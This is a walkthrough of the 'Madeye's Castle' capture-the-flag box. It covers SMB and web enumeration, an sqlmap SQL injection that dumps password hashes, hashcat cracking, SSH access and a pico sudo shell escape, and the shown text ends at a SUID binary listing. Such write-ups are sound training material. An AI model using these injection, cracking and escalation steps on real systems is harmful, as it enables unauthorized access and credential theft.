# Madeye's Castle

A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja

Have fun storming Madeye's Castle! In this room you will need to fully enumerate the system, gain a foothold, and then pivot around to a few different users. 

# User1.txt

*Hint: Find the different user. Keep enumerating.*

## Footprint

Nmap detects a Samba network share, SSH and a web port, all services running on their standard ports:

~~~
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
|_  256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: HOGWARTZ-CASTLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: hogwartz-castle
|   NetBIOS computer name: HOGWARTZ-CASTLE\x00
|   Domain name: \x00
|   FQDN: hogwartz-castle
|_  System time: 2021-05-07T17:52:11+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-07T17:52:11
|_  start_date: N/A
~~~

## Samba

Let's start with the Samba network share. Enumerating the network shares without authentication reveals a network share (`sambashare`):

~~~
┌──(kali㉿kali)-[/data/Madeye_s_Castle]
└─$ smbclient -L 10.10.227.45
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Harry's Important Files
	IPC$            IPC       IPC Service (hogwartz-castle server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
~~~

Connecting to this network share shows 2 files:

~~~
┌──(kali㉿kali)-[/data/Madeye_s_Castle]
└─$ smbclient //10.10.227.45/sambashare  
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 02:19:20 2020
  ..                                  D        0  Thu Nov 26 01:57:55 2020
  spellnames.txt                      N      874  Thu Nov 26 02:06:32 2020
  .notes.txt                          H      147  Thu Nov 26 02:19:19 2020

		9219412 blocks of size 1024. 4411812 blocks available
smb: \> get .notes.txt -
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
getting file \.notes.txt of size 147 as - (0.7 KiloBytes/sec) (average 1.9 KiloBytes/sec)
smb: \> get spellnames.txt -
avadakedavra
crucio
imperio
morsmordre
brackiumemendo
confringo

[REDACTED]

accio
anapneo
incendio
evanesco
aguamenti
getting file \spellnames.txt of size 874 as - (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
~~~

We are provided with 2 potential usernames (`hagrid` and `hermonine`) and a password list (`spellnames.txt`). Let's save the 2 users in a `usernames.txt` file.

~~~
$ cat > usernames.txt << EOF
hagrid
hermonine
EOF
~~~

## Web

### Virtual host

Analyzing the source code of the main page reveals a virtual host (`hogwartz-castle.thm`):

~~~
┌──(kali㉿kali)-[/data/Madeye_s_Castle/files]
└─$ curl -s http://10.10.227.45/ | head        

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
        TODO: Virtual hosting is good. 
        TODO: Register for hogwartz-castle.thm
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: Amazingly It works</title>
~~~

Let's add this virtual host to our `/etc/hosts` file:

~~~
echo "10.10.227.45 hogwartz-castle.thm" | sudo tee -a /etc/hosts
~~~

Browsing this virtual host in a browser shows a page with an authentication. I tried to brute force it with the files gathered so far but it failed.

~~~
┌──(kali㉿kali)-[/data/Madeye_s_Castle/files]
└─$ hydra -L usernames.txt -P spellnames.txt hogwartz-castle.thm http-post-form "/login:user=^USER^&password=^PASS^:Incorrect Username or Password"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-07 20:19:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 162 login tries (l:2/p:81), ~11 tries per task
[DATA] attacking http-post-form://hogwartz-castle.thm:80/login:user=^USER^&password=^PASS^:Incorrect Username or Password
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-07 20:19:30
~~~

### Main website

Further enumerating the main website reveals that there is a `/backup` location:

~~~
┌──(kali㉿kali)-[/data/Madeye_s_Castle/files]
└─$ gobuster dir -u http://10.10.227.45 -x php,txt,bak,old,zip,tar -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.227.45
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,bak,old,zip,tar
[+] Timeout:                 10s
===============================================================
2021/05/07 20:33:24 Starting gobuster in directory enumeration mode
===============================================================
/.hta.tar             (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.bak             (Status: 403) [Size: 277]
/.hta.old             (Status: 403) [Size: 277]
/.hta.zip             (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.tar        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.bak        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.old        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.zip        (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htaccess.old        (Status: 403) [Size: 277]
/.htaccess.zip        (Status: 403) [Size: 277]
/.htaccess.tar        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/backup               (Status: 301) [Size: 313] [--> http://10.10.227.45/backup/]
/index.html           (Status: 200) [Size: 10965]                                
/server-status        (Status: 403) [Size: 277]                                  
                                                                                 
===============================================================
2021/05/07 20:37:42 Finished
===============================================================
~~~

### Email file

Enumerating the location reveals an `email` file:

~~~                                                                                                                     
┌──(kali㉿kali)-[/data/Madeye_s_Castle/files]
└─$ gobuster dir -u http://10.10.227.45/backup/ -x php,txt,bak,old,zip,tar -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.227.45/backup/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              tar,php,txt,bak,old,zip
[+] Timeout:                 10s
===============================================================
2021/05/07 20:38:20 Starting gobuster in directory enumeration mode
===============================================================
/.hta.bak             (Status: 403) [Size: 277]
/.hta.old             (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.zip             (Status: 403) [Size: 277]
/.hta.tar             (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htaccess.zip        (Status: 403) [Size: 277]
/.htpasswd.bak        (Status: 403) [Size: 277]
/.htaccess.tar        (Status: 403) [Size: 277]
/.htpasswd.old        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.zip        (Status: 403) [Size: 277]
/.htpasswd.tar        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.old        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/email                (Status: 200) [Size: 1527]
                                                
===============================================================
2021/05/07 20:43:51 Finished
===============================================================
~~~

Below is the content of the email:

~~~
┌──(kali㉿kali)-[/data/Madeye_s_Castle/files]
└─$ curl -s http://10.10.227.45/backup/email   
Madeye,

It is done. I registered the name you requested below but changed the "s" to a "z". You should be good to go.

RME

--------
On Tue, Nov 24, 2020 at 8:54 AM Madeye Moody <ctf@madeye.ninja> wrote:
Mr. Roar M. Echo,

Sounds great! Thanks, your mentorship is exactly what we need to avoid legal troubles with the Ministry of Magic.

Magically Yours,
madeye

--------
On Tue, Nov 24, 2020 at 8:53 AM Roar May Echo <info@roarmayecho.com> wrote:
Madeye,

I don't think we can do "hogwarts" due to copyright issues, but let’s go with "hogwartz", how does that sound?

Roar

--------
On Tue, Nov 24, 2020 at 8:52 AM Madeye Moody <ctf@madeye.ninja> wrote:
Dear Mr. Echo,

Thanks so much for helping me develop my castle for TryHackMe. I think it would be great to register the domain name of "hogwarts-castle.thm" for the box. I have been reading about virtual hosting in Apache and it's a great way to host multiple domains on the same server. The docs says that...

> The term Virtual Host refers to the practice of running more than one web site (such as 
> company1.example.com and company2.example.com) on a single machine. Virtual hosts can be 
> "IP-based", meaning that you have a different IP address for every web site, or "name-based", 
> meaning that you have multiple names running on each IP address. The fact that they are 
> running on the same physical server is not apparent to the end user.

You can read more here: https://httpd.apache.org/docs/2.4/vhosts/index.html

What do you think?

Thanks,
madeye
~~~

Not very helpful as we are already aware of the virtual host.

## SQL injection

After attempting to brute force the authentication page with `rockyou.txt` during hours without success, I aborted the process and attempted an SQL injection.

SQLMap detected that the backend was SQLite and was able to dump the content of the database:

~~~
┌──(kali㉿kali)-[/data/Madeye_s_Castle/files]
└─$ sqlmap -r login.xml --risk=3 --level=5 --dump-all --threads 5
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:04:02 /2021-05-07/

[21:04:02] [INFO] parsing HTTP request from 'login.xml'
[21:04:02] [INFO] resuming back-end DBMS 'sqlite' 
[21:04:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: user=-9207' OR 5441=5441-- qrTF&password=password
---
[21:04:02] [INFO] the back-end DBMS is SQLite


[REDACTED]


Database: <current>
Table: users
[40 entries]
+------------------+-------+-------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+
| name             | admin | notes                                                             | password                                                                                                                         |
+------------------+-------+-------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+
| Lucas Washington | 0     | contact administrator. Congrats on SQL injection... keep digging  | c53d7af1bbe101a6b45a3844c89c8c06d8ac24ed562f01b848cad9925c691e6f10217b6594532b9cd31aa5762d85df642530152d9adb3005fac407e2896bf492 |
| Harry Turner     | 0     | My linux username is my first name, and password uses best64      | b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885 |
| Andrea Phillips  | 0     |  contact administrator. Congrats on SQL injection... keep digging | e1ed732e4aa925f0bf125ae8ed17dd2d5a1487f9ff97df63523aa481072b0b5ab7e85713c07e37d9f0c6f8b1840390fc713a4350943e7409a8541f15466d8b54 |
| Liam Hernandez   | 0     | contact administrator. Congrats on SQL injection... keep digging  | 5628255048e956c9659ed4577ad15b4be4177ce9146e2a51bd6e1983ac3d5c0e451a0372407c1c7f70402c3357fc9509c24f44206987b1a31d43124f09641a8d |
| Adam Jenkins     | 0     | contact administrator. Congrats on SQL injection... keep digging  | 2317e58537e9001429caf47366532d63e4e37ecd363392a80e187771929e302922c4f9d369eda97ab7e798527f7626032c3f0c3fd19e0070168ac2a82c953f7b |
| Landon Alexander | 0     | contact administrator. Congrats on SQL injection... keep digging  | 79d9a8bef57568364cc6b4743f8c017c2dfd8fd6d450d9045ad640ab9815f18a69a4d2418a7998b4208d509d8e8e728c654c429095c16583cbf8660b02689905 |
| Kennedy Anderson | 0     |  contact administrator. Congrats on SQL injection... keep digging | e3c663d68c647e37c7170a45214caab9ca9a7d77b1a524c3b85cdaeaa68b2b5e740357de2508142bc915d7a16b97012925c221950fb671dd513848e33c33d22e |
| Sydney Wright    | 0     |  contact administrator. Congrats on SQL injection... keep digging | d3ccca898369a3f4cf73cbfc8daeeb08346edf688dc9b7b859e435fe36021a6845a75e4eddc7a932e38332f66524bd7876c0c613f620b2030ed2f89965823744 |
| Aaliyah Sanders  | 0     |  contact administrator. Congrats on SQL injection... keep digging | dc2a6b9462945b76f333e075be0bc2a9c87407a3577f43ba347043775a0f4b5c1a78026b420a1bf7da84f275606679e17ddc26bceae25dad65ac79645d2573c0 |
| Olivia Murphy    | 0     |  contact administrator. Congrats on SQL injection... keep digging | 6535ee9d2b8d6f2438cf92da5a00724bd2539922c83ca19befedbe57859ceafd6d7b9db83bd83c26a1e070725f6f336e21cb40295ee07d87357c34b6774dd918 |
| Olivia Ross      | 0     |  contact administrator. Congrats on SQL injection... keep digging | 93b4f8ce01b44dd25c134d0517a496595b0b081cef6eb625e7eb6662cb12dd69c6437af2ed3a5972be8b05cc14a16f46b5d11f9e27e6550911ed3d0fe656e04d |
| Grace Brooks     | 0     |  contact administrator. Congrats on SQL injection... keep digging | 9a311251255c890692dc84b7d7d66a1eefc5b89804cb74d16ff486927014d97502b2f790fbd7966d19e4fbb03b5eb7565afc9417992fc0c242870ea2fd863d6d |
| Jordan White     | 0     | contact administrator. Congrats on SQL injection... keep digging  | 5ed63206a19b036f32851def04e90b8df081071aa8ca9fb35ef71e4daf5e6c6eab3b3fea1b6e50a45a46a7aee86e4327f73a00f48deb8ae2bf752f051563cc8b |
| Diego Baker      | 0     | contact administrator. Congrats on SQL injection... keep digging  | 87ac9f90f01b4b2ae775a7cb96a8a04d7ab7530282fd76224ee03eecab9114275540e4b6a2c52e890cf11f62aacb965be0c53c48c0e51bf731d046c5c3182aad |
| Liam Ward        | 0     | contact administrator. Congrats on SQL injection... keep digging  | 88344d6b7724bc0e6e3247d4912fa755a5a91c2276e08610462f6ea005d16fd5e305dfe566e7f1dd1a98afe1abfa38df3d9697cdc47ecbb26ac4d21349d09ba7 |
| Carlos Barnes    | 0     | contact administrator. Congrats on SQL injection... keep digging  | 7f67af71e8cbb7188dd187b7da2386cc800ab8b863c9d0b2dce87c98a91b5511330a2ad4f7d73592b50a2a26c26970cfbd22f915d1967cd92569dbf5e24ac77e |
| Carlos Lopez     | 0     | contact administrator. Congrats on SQL injection... keep digging  | 8c8702dbb6de9829bcd6da8a47ab26308e9db7cb274b354e242a9811390462a51345f5101d7f081d36eea4ec199470162775c32cb1f4a96351dc385711619671 |
| Oliver Gonzalez  | 0     | contact administrator. Congrats on SQL injection... keep digging  | c809b40b7c3c0f095390f3cd96bb13864b7e8fd1670c6b1c05b1e26151be62782b97391b120cb4a8ee1d0c9b8fffaf12b44c9d084ae6041468ad5f12ec3d7a4e |
| Sophie Sanchez   | 0     |  contact administrator. Congrats on SQL injection... keep digging | 68b519187b9e2552d555cb3e9183711b939f94dfe2f71bda0172ee8402acf074cc0f000611d68d2b8e9502fa7235c8a25d72da50916ad0689e00cb4f47283e9b |
| Maya Sanders     | 0     |  contact administrator. Congrats on SQL injection... keep digging | 7eea93d53fbed3ba8f2fa3d25c5f16fe5eaff1f5371918e0845d2076a2e952a457390ad87d289bf25f9457032f14bb07dcd625d03f2f5ee5c887c09dc7107a66 |
| Joshua Reed      | 0     | contact administrator. Congrats on SQL injection... keep digging  | e49608634f7de91d19e5e1b906e10c5a4a855a4fe32521f310727c9875e823c82b3e0347b32ef49ea44657e60e771d9e326d40ab60ce3a950145f1a7a79d3124 |
| Aaliyah Allen    | 0     |  contact administrator. Congrats on SQL injection... keep digging | c063c5215b56091327a1f25e38e2d0a5e6db83cceb0ab29cbb0bedd686c18ee5770bfbbfa0a4ac542c8935b0fb63e30ea0bc0408d3523157d840fdfa54ec8dab |
| Jasmine King     | 0     |  contact administrator. Congrats on SQL injection... keep digging | 487daab566431e86172ed68f0836f3221592f91c94059a725d2fdca145f97e6258593929c37d0339ca68614a52f4df61953b930585c4968cedaaa836744c52a6 |
| Jonathan Long    | 0     | contact administrator. Congrats on SQL injection... keep digging  | 44b1fbcbcd576b8fd69bf2118a0c2b82ccf8a6a9ef2ae56e8978e6178e55b61d491f6fc152d07f97ca88c6b7532f25b8cd46279e8a2c915550d9176f19245798 |
| Samuel Anderson  | 0     | contact administrator. Congrats on SQL injection... keep digging  | a86fa315ce8ed4d8295bf6d0139f23ba80e918a54a132e214c92c76768f27ce002253834190412e33c9af4ea76befa066d5bdeb47363f228c509b812dc5d81df |
| Julian Robinson  | 0     | contact administrator. Congrats on SQL injection... keep digging  | a1f6e38be4bf9fd307efe4fe05522b8c3a9e37fc2c2930507e48cb5582d81f73814ffb543cef77b4b24a18e70e2670668d1a5b6e0b4cb34af9706890bd06bbc9 |
| Gianna Harris    | 0     |  contact administrator. Congrats on SQL injection... keep digging | 01529ec5cb2c6b0300ed8f4f3df6b282c1a68c45ff97c33d52007573774014d3f01a293a06b1f0f3eb6e90994cb2a7528d345a266203ef4cd3d9434a3a033ec0 |
| Madelyn Morgan   | 0     |  contact administrator. Congrats on SQL injection... keep digging | d17604dbb5c92b99fe38648bbe4e0a0780f2f4155d58e7d6eddd38d6eceb62ae81e5e31a0a2105de30ba5504ea9c75175a79ed23cd18abcef0c8317ba693b953 |
| Ella Garcia      | 0     |  contact administrator. Congrats on SQL injection... keep digging | ac67187c4d7e887cbaccc625209a8f7423cb4ad938ec8f50c0aa5002e02507c03930f02fab7fab971fb3f659a03cd224669b0e1d5b5a9098b2def90082dfdbd2 |
| Zoey Gonzales    | 0     |  contact administrator. Congrats on SQL injection... keep digging | 134d4410417fb1fc4bcd49abf4133b6de691de1ef0a4cdc3895581c6ad19a93737cd63cb8d177db90bd3c16e41ca04c85d778841e1206193edfebd4d6f028cdb |
| Abigail Morgan   | 0     |  contact administrator. Congrats on SQL injection... keep digging | afcaf504e02b57f9b904d93ee9c1d2e563d109e1479409d96aa064e8fa1b8ef11c92bae56ddb54972e918e04c942bb3474222f041f80b189aa0efd22f372e802 |
| Joseph Rivera    | 0     | contact administrator. Congrats on SQL injection... keep digging  | 6487592ed88c043e36f6ace6c8b6c59c13e0004f9751b0c3fdf796b1965c48607ac3cc4256cc0708e77eca8e2df35b668f5844200334300a17826c033b03fe29 |
| Elizabeth Cook   | 0     |  contact administrator. Congrats on SQL injection... keep digging | af9f594822f37da8ed0de005b940158a0837060d3300be014fe4a12420a09d5ff98883d8502a2aaffd64b05c7b5a39cdeb5c57e3005c3d7e9cadb8bb3ad39ddb |
| Parker Cox       | 0     | contact administrator. Congrats on SQL injection... keep digging  | 53e7ea6c54bea76f1d905889fbc732d04fa5d7650497d5a27acc7f754e69768078c246a160a3a16c795ab71d4b565cde8fdfbe034a400841c7d6a37bdf1dab0d |
| Savannah Torres  | 0     |  contact administrator. Congrats on SQL injection... keep digging | 11f9cd36ed06f0c166ec34ab06ab47f570a4ec3f69af98a3bb145589e4a221d11a09c785d8d3947490ae4cd6f5b5dc4eb730e4faeca2e1cf9990e35d4b136490 |
| Aaliyah Williams | 0     |  contact administrator. Congrats on SQL injection... keep digging | 9dc90274aef30d1c017a6dc1d5e3c07c8dd6ae964bcfb95cadc0e75ca5927faa4d72eb01836b613916aea2165430fc7592b5abb19b0d0b2476f7082bfa6fb760 |
| Blake Washington | 0     | contact administrator. Congrats on SQL injection... keep digging  | 4c968fc8f5b72fd21b50680dcddea130862c8a43721d8d605723778b836bcbbc0672d20a22874af855e113cba8878672b7e6d4fc8bf9e11bc59d5dd73eb9d10e |
| Claire Miller    | 0     |  contact administrator. Congrats on SQL injection... keep digging | d4d5f4384c9034cd2c77a6bee5b17a732f028b2a4c00344c220fc0022a1efc0195018ca054772246a8d505617d2e5ed141401a1f32b804d15389b62496b60f24 |
| Brody Stewart    | 0     | contact administrator. Congrats on SQL injection... keep digging  | 36e2de7756026a8fc9989ac7b23cc6f3996595598c9696cca772f31a065830511ac3699bdfa1355419e07fd7889a32bf5cf72d6b73c571aac60a6287d0ab8c36 |
| Kimberly Murphy  | 0     |  contact administrator. Congrats on SQL injection... keep digging | 8f45b6396c0d993a8edc2c71c004a91404adc8e226d0ccf600bf2c78d33ca60ef5439ccbb9178da5f9f0cfd66f8404e7ccacbf9bdf32db5dae5dde2933ca60e6 |
+------------------+-------+-------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+

[22:35:59] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/hogwartz-castle.thm/dump/SQLite_masterdb/users.csv'
[22:35:59] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 27584 times
[22:35:59] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/hogwartz-castle.thm'

[*] ending @ 22:35:59 /2021-05-07/

~~~

All notes are the same, but for 1 user:

~~~
| Harry Turner     | 0     | My linux username is my first name, and password uses best64      | b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885 |
~~~

## Crack harry's password

Searching for `best64` on the Internet led me to [this link](https://hunter2.gitbook.io/darthsidious/credential-access/password-cracking-and-auditing#rules-based-attack).

Save the SH512 string to `hash.txt` and crack it using the `best64.rule` in `hashcat`:

~~~
┌──(kali㉿kali)-[/data/Madeye_s_Castle/files]
└─$ hashcat -m 1700 -a 0 hash.txt -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt                                          1 ⨯
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-4800MQ CPU @ 2.70GHz, 2861/2925 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 1104517645
* Runtime...: 2 secs

b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA2-512
Hash.Target......: b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd6...c5c885
Time.Started.....: Fri May  7 23:02:48 2021 (8 secs)
Time.Estimated...: Fri May  7 23:02:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5014.4 kH/s (7.59ms) @ Accel:256 Loops:77 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 43642368/1104517645 (3.95%)
Rejected.........: 0/43642368 (0.00%)
Restore.Point....: 566272/14344385 (3.95%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidates.#1....: wolfs1 -> w7w7w7

Started: Fri May  7 23:02:08 2021
Stopped: Fri May  7 23:02:58 2021
~~~

The username was the first name (`harry`) and the password is `wingardiumleviosa123`

## Connect as harry

~~~
┌──(kali㉿kali)-[/data/Madeye_s_Castle/files]
└─$ ssh harry@10.10.227.45
The authenticity of host '10.10.227.45 (10.10.227.45)' can't be established.
ECDSA key fingerprint is SHA256:tqvs4QmNV2BNfZVq42KFIsFtERVf7F4W5ziragiTf/0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.227.45' (ECDSA) to the list of known hosts.
harry@10.10.227.45's password: 
 _      __    __                     __         __ __                          __
 | | /| / /__ / /______  __ _  ___   / /____    / // /__  ___ __    _____ _____/ /____
 | |/ |/ / -_) / __/ _ \/  ' \/ -_) / __/ _ \  / _  / _ \/ _ `/ |/|/ / _ `/ __/ __/_ /
 |__/|__/\__/_/\__/\___/_/_/_/\__/  \__/\___/ /_//_/\___/\_, /|__,__/\_,_/_/  \__//__/
                                                        /___/

Last login: Thu Nov 26 01:42:18 2020
harry@hogwartz-castle:~$ ll
total 32
drwxr-x--- 4 harry harry 4096 Nov 26 01:28 ./
drwxr-xr-x 4 root  root  4096 Nov 26 01:50 ../
lrwxrwxrwx 1 root  root     9 Nov 26 01:06 .bash_history -> /dev/null
-rw-r----- 1 harry harry  220 Apr  4  2018 .bash_logout
-rw-r----- 1 harry harry 3771 Apr  4  2018 .bashrc
drwx------ 2 harry harry 4096 Nov 26 01:17 .cache/
drwx------ 3 harry harry 4096 Nov 26 01:17 .gnupg/
-rw-r----- 1 harry harry  807 Apr  4  2018 .profile
-rw-r----- 1 harry harry   40 Nov 26 01:06 user1.txt
harry@hogwartz-castle:~$ cat user1.txt 
RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}
~~~

User flag: `RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}`

# User2.txt

*Hint: She is a know it all and wants you to share her love for the metric system*

## Lateral move (harry -> hermonine)

Harry can run `pico` as `hermonine`:

~~~
harry@hogwartz-castle:~$ sudo -l
[sudo] password for harry: 
Matching Defaults entries for harry on hogwartz-castle:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry may run the following commands on hogwartz-castle:
    (hermonine) /usr/bin/pico
    (hermonine) /usr/bin/pico
~~~

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/pico/) reveals that we can run a shell with `pico` to move laterally to `hermonine`:

~~~
harry@hogwartz-castle:~$ sudo -u hermonine pico
^R^X
reset; bash 1>&0 2>&0
~~~

## User flag #2

Now connected as `hermonine` and get the user flag.

~~~
hermonine@hogwartz-castle:~$ id
uid=1002(hermonine) gid=1002(hermonine) groups=1002(hermonine)
hermonine@hogwartz-castle:/home/hermonine$ cat user2.txt
RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}
~~~

At this stage, it may be a good idea to add your SSH public key to `/home/hermonine/.ssh/authorized_keys` to connect as `hermonine` directly against SSH.

# Root.txt

*Hint: Time is tricky. Can you trick time.*

## The swagger binary

Checking files owned by `root` with the SUID bit set reveals an interesting binary:

~~~
hermonine@hogwartz-castle:~$ find / -type f -user root -perm -u=s -exec ls -l {} + 2>/dev/null
-rwsr-xr-x 1 root root        30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root        43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root        64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root        44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root        26696 Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root root         8816 Nov 26 01:06 /srv/time-turner/swagger <------------- interesting
-rwsr-xr-x 1 root root        76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root        44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root        75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root        40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root        37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root        59640 Mar 22  2019 /usr/bin/passwd
